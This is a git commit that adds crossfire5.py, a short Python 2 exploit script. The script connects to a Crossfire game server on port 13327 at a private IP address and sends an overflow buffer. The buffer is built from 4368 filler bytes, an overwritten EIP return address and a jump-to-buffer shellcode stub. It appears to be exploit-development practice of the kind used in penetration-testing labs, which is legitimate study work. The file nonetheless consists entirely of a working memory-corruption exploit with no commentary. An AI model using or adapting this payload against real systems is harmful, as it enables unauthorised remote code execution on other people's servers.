1042a350a057a593c5048e9bfaa0c237f247b6f5
CyberDen <110781601+CyberDen1@users.noreply.github.com>
2022-12-23 02:06:34 +0300

    Add files via upload

---
+++ crossfire5.py
@@ -0,0 +1,15 @@
+#!/usr/bin/python
+import socket
+
+host = "192.168.0.105"
+crash = "\x41" * 4368
+eip = "\x96\x45\x13\x08"
+shell1 = "\x83\xc0\x0c\xff\xe0\x90\x90"
+buffer = "\x11(setup sound " + crash + eip + shell1 + "\x90\x00#"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "[*]Sending evil buffer..."
+s.connect((host, 13327))
+print s.recv(1024)
+s.send(buffer)
+s.close()
+print "[*]Payload Sent!"
